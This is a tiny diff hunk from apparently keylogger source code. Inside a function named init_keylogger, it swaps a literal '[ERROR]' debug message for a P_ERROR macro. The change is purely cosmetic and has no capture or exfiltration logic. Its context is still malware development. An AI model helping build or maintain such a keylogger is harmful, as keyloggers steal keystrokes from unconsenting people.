@@ -34,7 +34,7 @@ int init_keylogger()
 			if (!file)
 			{
 #ifdef DEBUG
-				printf("[ERROR] No file?\n");
+				printf(P_ERROR"No file?\n");
 #endif
 				return ERROR;
 			}
